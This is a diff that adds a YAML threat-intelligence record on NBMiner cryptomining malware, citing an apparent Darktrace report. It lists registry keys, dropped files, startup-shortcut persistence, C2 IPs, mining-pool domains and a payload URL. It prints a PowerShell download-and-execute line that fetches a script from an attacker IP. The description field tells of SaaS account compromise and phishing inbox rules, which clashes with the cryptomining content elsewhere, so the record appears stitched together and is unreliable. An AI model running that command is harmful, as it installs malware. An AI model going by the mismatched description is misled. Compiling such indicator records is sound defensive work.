@@ -1,0 +1,51 @@
+description: A 2025 incident involving compromised SaaS accounts and internal device
+  logins from rare external IPs linked to VPS providers, with subsequent phishing
+  email activity and inbox rule creation for concealment.
+attribution: Unknown threat actor or group; no specific attribution provided in the
+  report.
+malware_families:
+- NBMiner
+TTPs:
+  processes: []
+  commandline: []
+  powershell:
+  - Invoke-Expression (New-Object Net.WebClient).DownloadString("http://45.141.87.195/infect.ps1")
+  scripting_engine: []
+  registry_keys:
+  - HKCU:\\Software\\LordNet
+  - HKCU\\Software\\kap
+  image_load: []
+  network_connections:
+  - process: ''
+    destination_address: 45.141.87.195
+    port: 8000
+    protocol: HTTP
+  - process: ''
+    destination_address: 152.53.121.6
+    port: 10001
+    protocol: TCP
+  file_activity:
+  - '%LOCALAPPDATA%\\knzbsrgw.exe'
+  - '%LOCALAPPDATA%\\rauuq'
+  - '%LOCALAPPDATA%\\qmsxehehhnnwioojlyegmdssiswak'
+  - '%APPDATA%\\nbminer.exe'
+  persistence:
+  - Shortcut file xxyntxsmitwgruxuwqzypomkhxhml.lnk in startup folder
+  process_relations: []
+IOCs:
+  hashes:
+  - Db3534826b4f4dfd9f4a0de78e225ebb
+  ips:
+  - 45.141.87.195
+  - 152.53.121.6
+  domains:
+  - gulf.moneroocean.stream
+  - monerooceans.stream
+  urls:
+  - https://api.chimera-hosting.zip/frfnhis/zdpaGgLMav/nbminer.exe
+authors:
+- Keanna Grelicha (Cyber Analyst)
+- Tara Gould (Threat Research Lead)
+reference: https://www.darktrace.com/blog/from-powershell-to-payload-darktraces-detection-of-a-novel-cryptomining-malware
+date_of_publication: September 04, 2025
+file_creation_date: September 04, 2025
